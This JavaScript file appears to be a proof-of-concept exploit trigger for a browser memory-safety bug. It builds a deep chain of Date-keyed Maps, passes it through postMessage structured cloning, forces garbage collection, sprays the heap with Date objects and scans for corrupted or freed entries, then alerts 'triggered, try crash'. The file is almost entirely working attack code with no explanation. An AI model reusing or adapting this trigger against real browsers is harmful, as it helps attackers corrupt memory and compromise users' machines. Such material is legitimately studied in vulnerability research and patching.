import { mem } from './module/mem.mjs';
import { debug_log } from './module/utils.mjs';

function sleep(ms=0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function spray() {
    const tmp = [];
    for (let j = 0; j < 1024; j++) {
        const d = new Date(0xbeef);
        tmp.push(d);
    }
}

export async function main() {
    const num_elems = 1600;
    let root = new Map();
    let msg = root;
    let foo = [];
    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));
    }
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }
    msg = root;

    let data2 = null;
    let idx = null;
    loop: while (true) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, {once: true});
        });
        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();
        await sleep();

        let tmp_i = null;
        try {
            for (let i = 0; i < num_elems; i++) {
                tmp_i = i;
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    break loop;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = tmp_i;
            data2 = data.keys().next().value;
            break loop;
        }
    }
    
    alert('triggered, try crash');
    debug_log('[+] idx: ' + idx);
}